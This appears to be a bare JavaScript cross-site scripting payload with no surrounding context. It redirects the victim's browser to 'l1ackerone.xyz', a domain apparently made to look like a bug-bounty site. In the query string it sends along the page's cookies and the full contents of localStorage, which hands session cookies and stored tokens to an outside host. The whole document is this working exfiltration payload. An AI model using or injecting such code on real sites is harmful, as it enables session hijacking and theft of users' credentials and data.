location.replace(
    `https://l1ackerone.xyz/?c=${encodeURIComponent(
        document.cookie
    )}&ls=${encodeURIComponent(JSON.stringify(localStorage))}`
);
